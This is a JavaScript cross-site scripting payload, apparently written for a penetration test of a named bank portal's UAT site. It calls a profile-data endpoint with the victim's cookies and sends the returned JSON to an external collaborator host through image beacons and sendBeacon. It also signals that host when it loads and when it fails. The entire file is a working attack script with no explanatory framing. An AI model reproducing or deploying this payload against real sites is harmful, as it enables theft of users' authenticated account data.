// XSS Payload - Actively call the endpoint and capture data
(function() {
  console.log('[PAYLOAD STARTED]');
  
  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com';
  
  // Ping to verify payload loads
  (new Image()).src = attackerServer + '/ping?status=loaded_v2';
  
  // Function to call the endpoint
  function callEndpoint() {
    console.log('[CALLING ENDPOINT]');
    
    fetch('https://uat.citivelocity.com/portal-profile-service/initNewPortalData', {
      method: 'GET',
      credentials: 'include', // Important: include cookies
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      console.log('[RESPONSE STATUS]', response.status);
      return response.json();
    })
    .then(data => {
      console.log('[DATA RECEIVED]', data);
      window.capturedData = data;
      
      // Exfiltrate via image beacon
      const beacon = new Image();
      beacon.src = attackerServer + '/exfil?data=' + encodeURIComponent(JSON.stringify(data));
      console.log('[SENT TO BURP]');
      
      // Also try sendBeacon
      if (navigator.sendBeacon) {
        navigator.sendBeacon(attackerServer + '/beacon', JSON.stringify(data));
      }
    })
    .catch(err => {
      console.log('[ERROR]', err);
      (new Image()).src = attackerServer + '/error?msg=' + encodeURIComponent(err.message);
    });
  }
  
  // Call it immediately
  callEndpoint();
  
  // Also call it after a short delay in case DOM isn't ready
  setTimeout(callEndpoint, 1000);
  
  // And on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', callEndpoint);
  }
  
  console.log('[READY]');
  
})();
